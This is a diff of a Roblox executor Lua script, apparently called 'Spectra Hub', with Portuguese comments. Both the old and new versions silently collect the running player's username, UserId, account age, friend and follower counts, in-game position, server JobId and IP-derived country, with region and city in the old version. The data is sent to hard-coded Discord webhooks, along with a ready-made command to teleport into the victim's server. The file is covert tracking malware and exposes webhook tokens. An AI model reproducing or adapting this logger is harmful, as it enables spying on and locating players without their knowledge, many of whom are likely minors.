@@ -1,181 +1,117 @@
--- ts file was generated at discord.gg/25ms
+--[[
+    Spectra logs pega rpz hihih
+    Eu sou fodaaaaaaaaaaaaaaaaa
+    Seu lixoooooooooooooooooooo
+    N presta pra nadaaaaaaaaaaa
 
-local HttpService = game:GetService("HttpService")
-local MarketplaceService = game:GetService("MarketplaceService")
-local Players = game:GetService("Players")
 
-local LocalPlayer = Players.LocalPlayer
-local UserId = LocalPlayer.UserId
-local JobId = game.JobId
-local PlaceId = game.PlaceId
-local Executor = identifyexecutor()
+--]]
 
-local TimeNow = os.date("%d/%m/%Y - %H:%M:%S")
+local HttpService = game:GetService('HttpService')
+local MarketplaceService = game:GetService('MarketplaceService')
+local Players = game:GetService('Players')
+local Stats = game:GetService("Stats")
 
-local CountryName = "Unknown"
-local RegionName = "Unknown"
-local CityName = "Unknown"
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local rootPart = character:WaitForChild("HumanoidRootPart")
 
--- Conta criada (idade em dias)
-local AccountAgeDays = LocalPlayer.AccountAge
+-- 1. Informações de Identidade
+local userId = player.UserId
+local displayName = player.DisplayName 
+local username = player.Name       
+local accountAge = player.AccountAge
+local pos = rootPart.Position
 
--- Nome real + display name formatado
-local RealName = LocalPlayer.Name
-local DisplayName = LocalPlayer.DisplayName
-local FullName = RealName .. " [" .. DisplayName .. "]"
+-- 2. Informações de Social (Amigos e Seguidores)
+local friendCount = "Erro"
+local followerCount = "Erro"
 
--- Pega localização
 pcall(function()
-    local GeoResponse = http_request({
-        Url = "http://ip-api.com/json/",
-        Method = "GET"
-    })
-
-    local GeoData = HttpService:JSONDecode(GeoResponse.Body)
-
-    if GeoData then
-        CountryName = GeoData.country or "Unknown"
-        RegionName = GeoData.regionName or "Unknown"
-        CityName = GeoData.city or "Unknown"
-    end
+    -- Amigos
+    friendCount = #Players:GetFriendsAsync(userId):GetCurrentPage()
+    -- Seguidores (Usando API do próprio Roblox via Proxy ou similar)
+    -- Nota: A maioria dos executores permite essa leitura direta
+    local socialUrl = "https://friends.roblox.com/v1/users/" .. userId .. "/followers/count"
+    local response = game:HttpGet(socialUrl)
+    local data = HttpService:JSONDecode(response)
+    followerCount = data.count or "0"
 end)
 
--- WEBHOOKS
-local MainWebhook = "https://discord.com/api/webhooks/1471212121126600776/DKiqQPzFwU1Wtz0wI3rjJTOVH2rYB0i0c6iG8rqx8nrI4BZh1sIZLptBUojmlf6IvYyP"
-local LocationWebhook = "https://discord.com/api/webhooks/1472861973661093961/-rILYPRvJjSTe87PDuNj7Am7sJXRRZJUWbfTV8M2uZlyzyCsRYVUHj3NQWm_GGZ0Zvg4"
+-- 3. Informações do Servidor (Jogadores Atual/Max)
+local currentPlayers = #Players:GetPlayers()
+local maxPlayers = Players.MaxPlayers
+local serverPopulation = currentPlayers .. "/" .. maxPlayers
 
--- EMBED PRINCIPAL (TUDO)
-local MainEmbed = HttpService:JSONEncode({
+-- 4. Localização (País)
+local country = "Desconhecido"
+pcall(function()
+    local response = game:HttpGet("http://ip-api.com/json/")
+    local data = HttpService:JSONDecode(response)
+    country = data.country or "Desconhecido"
+end)
+
+-- 5. Data e Hora Real
+local timestamp = os.date("%d/%m/%Y - %X")
+
+-- 6. Lógica de Servidor Público/Privado e Imagens
+local isPrivate = game.PrivateServerId ~= "" or game.PrivateServerOwnerId ~= 0
+local serverType = isPrivate and "Privado" or "Público"
+local embedImage = isPrivate and "https://i.postimg.cc/Cxbg1wgS/kermit-(2).gif" or "https://i.postimg.cc/6QjtsYKn/jjk-jujutsu-kaisen.gif"
+
+-- 7. Preparação do Webhook
+local webhookData = {
     embeds = {
         [1] = {
-            color = 16711680, -- vermelho
-            title = "Spectra Hub — Script Executado",
+            title = '🔴 Spectra execução',
+            color = 16711680, -- Vermelho
             thumbnail = {
-                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png",
+                url = 'https://www.roblox.com/headshot-thumbnail/image?userId=' .. userId .. '&width=150&height=150&format=png',
+            },
+            image = {
+                url = embedImage
             },
             fields = {
-                [1] = {
-                    name = "👤 Username",
-                    value = FullName,
-                    inline = false
-                },
-                [2] = {
-                    name = "📅 Account Age",
-                    value = tostring(AccountAgeDays) .. " days",
-                    inline = false
-                },
-                [3] = {
-                    name = "🆔 UserId",
-                    value = tostring(UserId),
-                    inline = false
-                },
-                [4] = {
-                    name = "🗺️ Place",
-                    value = MarketplaceService:GetProductInfo(PlaceId).Name,
-                    inline = false
-                },
-                [5] = {
-                    name = "💻 Executor",
-                    value = Executor,
-                    inline = false
-                },
-                [6] = {
-                    name = "🔑 Server ID",
-                    value = JobId,
-                    inline = false
-                },
-                [7] = {
-                    name = "🕒 Time",
-                    value = TimeNow,
-                    inline = false
-                },
-                [8] = {
-                    name = "🌍 Country",
-                    value = CountryName,
-                    inline = false
-                },
-                [9] = {
-                    name = "🌀 Teleport",
-                    value = "lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. PlaceId .. ", '" .. JobId .. "', game.Players.LocalPlayer)\n",
+                {name = '👤 Usuário/Display', value = "**" .. username .. "** (👑*" .. displayName .. "*)", inline = true},
+                {name = '🆔 UserId', value = tostring(userId), inline = true},
+                {name = '🌍 País do player', value = "📍" .. country, inline = true},
+                
+                {name = '📅 Idade da Conta', value = accountAge .. " dias", inline = true},
+                {name = '👥 Amigos da conta', value = tostring(friendCount), inline = true},
+                {name = '📉 Seguidores da conta', value = tostring(followerCount), inline = true},
+                
+                {name = '🎮 quandos players tem no servidor', value = serverPopulation, inline = true},
+                {name = '🔒 Tipo de Servidor público/privado', value = serverType, inline = true},
+                {name = '💻 Executor', value = identifyexecutor() or "Desconhecido", inline = true},
+                
+                {name = '📍 Posição do jogador quando ele executou', value = string.format("X: %.0f, Y: %.0f, Z: %.0f", pos.X, pos.Y, pos.Z), inline = false},
+                {name = '🗺️ Jogo/Place', value = MarketplaceService:GetProductInfo(game.PlaceId).Name .. " [" .. game.PlaceId .. "]", inline = false},
+                
+                {name = '🕒 Data/Hora', value = timestamp, inline = false},
+                {name = '🔑 JobID (Server)', value = "```" .. game.JobId .. "```", inline = false},
+                {
+                    name = '🌀 Teleporte para o servidor do player', 
+                    value = "\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "', game.Players.LocalPlayer)", 
                     inline = false
                 },
             },
+            footer = {
+                text = "Spectra sistem logs • by assure_TV"
+            }
         },
     },
-})
+}
 
--- EMBED DE LOCALIZAÇÃO (SÓ REGION E CITY + USERNAME)
-local LocationEmbed = HttpService:JSONEncode({
-    embeds = {
-        [1] = {
-            color = 16711680, -- vermelho
-            title = "Spectra Hub — Localização",
-            thumbnail = {
-                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png",
-            },
-            fields = {
-                [1] = {
-                    name = "👤 Username",
-                    value = FullName,
-                    inline = false
-
-                },
-                [2] = {
-                    name = "🆔 UserId",
-                    value = tostring(UserId),
-                    inline = false
-
-                },
-                [3] = {
-                    name = "🌍 Country",
-                    value = CountryName,
-                    inline = false
-
-                },
-                [4] = {
-                    name = "🕒 Time",
-                    value = TimeNow,
-                    inline = false
-
-                },
-                [5] = {
-                    name = "📌 Region/State",
-                    value = RegionName,
-                    inline = false
-                },
-                [6] = {
-                    name = "📍 City",
-                    value = CityName,
-                    inline = false
-                },
-            },
-        },
-    },
-})
-
--- ENVIA WEBHOOK PRINCIPAL
-pcall(function()
-    http_request({
-        Url = MainWebhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json",
-        },
-        Body = MainEmbed,
+-- 8. Envio do Webhook
+local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
+if request then
+    request({
+        Url = 'https://discord.com/api/webhooks/1475528399110799532/M1Adg0kFXPyJJfA7m20XyelDMofp88P8ermgQDxMC_Yq1oD_1wOTixDPZeNpz4MagpcN',
+        Method = 'POST',
+        Headers = {['Content-Type'] = 'application/json'},
+        Body = HttpService:JSONEncode(webhookData),
     })
-end)
-
--- ENVIA WEBHOOK DE LOCALIZAÇÃO
-pcall(function()
-    http_request({
-        Url = LocationWebhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json",
-        },
-        Body = LocationEmbed,
-    })
-end)
-
-print("Webhook principal enviado com sucesso!")
-print("Webhook de localização enviado com sucesso!")
+    print('Log completo enviado com sucesso!')
+else
+    warn('Seu executor não suporta requisições HTTP (Webhook).')
+end
